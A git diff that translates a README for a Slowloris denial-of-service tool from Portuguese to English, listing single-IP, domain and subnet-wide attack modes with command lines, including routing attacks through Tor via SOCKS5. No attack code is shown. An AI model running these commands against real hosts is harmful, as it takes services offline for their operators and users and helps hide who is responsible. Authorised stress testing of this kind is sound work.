@@ -1,14 +1,14 @@
 # Slowloris Tool
 
-Ferramenta unificada de testes Slowloris, com três modos de execução (até o momento):
+Unified tool for Slowloris testing, with three execution modes (so far):
 
-- **sniper** → ataque direcionado a um IP único  
-- **domain** → ataque direcionado a um domínio (resolve via DNS)  
-- **pitchfork** → teste em sub-rede + múltiplas portas de sua escolha
+- **sniper** → attack targeting a single IP 
+- **domain** → attack targeting a domain (resolved via DNS)
+- **pitchfork** → test across a subnet + multiple ports of your choice
 
 ---
 
-## Instalação
+## Installation
 
 ```bash
 git clone https://github.com/CLSxSH7/slowloris-tool.git
@@ -16,7 +16,7 @@ cd slowloris-tool
 pip install -r requirements.txt
 ```
 
-Para suporte a proxy **SOCKS5**, instale também:
+For SOCKS5 proxy support, also install:
 
 ```bash
 pip install PySocks
@@ -24,27 +24,27 @@ pip install PySocks
 
 ---
 
-## Uso
+## Usage
 
-### Menu interativo
+### Interactive menu
 
-Se executar sem parâmetros:
+If you run without parameters:
 
 ```bash
 python slowloris-tool.py
 ```
 
-Você verá um menu para escolher entre **sniper**, **domain** e **pitchfork**, com prompts para cada parâmetro.
+You will see a menu to choose between sniper, domain, and pitchfork, with prompts for each parameter.
 
 ---
 
-### Modo sniper (IP único)
+### Sniper mode (single IP)
 
 ```bash
 python slowloris-tool.py sniper 192.168.0.10 -p 80 -s 200 --https -ua --sleeptime 10
 ```
 
-Com proxy SOCKS5 (ex.: Tor):
+With SOCKS5 proxy (e.g., Tor):
 
 ```bash
 python slowloris-tool.py sniper 192.168.0.10 -p 80 --socks5 127.0.0.1:9050
@@ -52,13 +52,13 @@ python slowloris-tool.py sniper 192.168.0.10 -p 80 --socks5 127.0.0.1:9050
 
 ---
 
-### Modo domain (Domínio)
+### Domain mode
 
 ```bash
 python slowloris-tool.py domain example.com -p 443 --https -s 200 -ua
 ```
 
-Com proxy SOCKS5:
+With SOCKS5 proxy:
 
 ```bash
 python slowloris-tool.py domain example.com -p 443 --https --socks5 127.0.0.1:9050
@@ -66,29 +66,29 @@ python slowloris-tool.py domain example.com -p 443 --https --socks5 127.0.0.1:90
 
 ---
 
-### Modo pitchfork (Sub-rede/Portas)
+### Pitchfork mode (Subnet/Ports)
 
 ```bash
 python slowloris-tool.py pitchfork 192.168.0.0/24 -P 80,8080,443 -s 200 -t 50 -d 120
 ```
 
-> ⚠️ Neste modo, **não há suporte a SOCKS5** (execução direta).
+> ⚠️ In this mode, SOCKS5 proxy is not supported (direct execution only).
 
 ---
 
-## Dependências
+## Dependencies
 
 - Python 3.9+
 - `requests`
-- `PySocks` (apenas se for usar `--socks5`)
+- `PySocks` (only if using --socks5)
 
 ---
 
-## Observações
+## Notes
 
-- O parâmetro `--socks5` é suportado somente nos modos **sniper** e **domain**.  
-- O proxy é aplicado globalmente via `socket` monkeypatch.  
-- Para rodar via **Tor**, certifique-se de ter o serviço ativo na porta 9050:
+- The `--socks5` parameter is supported only in **sniper** and **domain** modes.
+- The proxy is applied globally using a `socket` monkeypatch. 
+- To run via **Tor**, make sure the service is active on port 9050:
 
 ```bash
 tor &
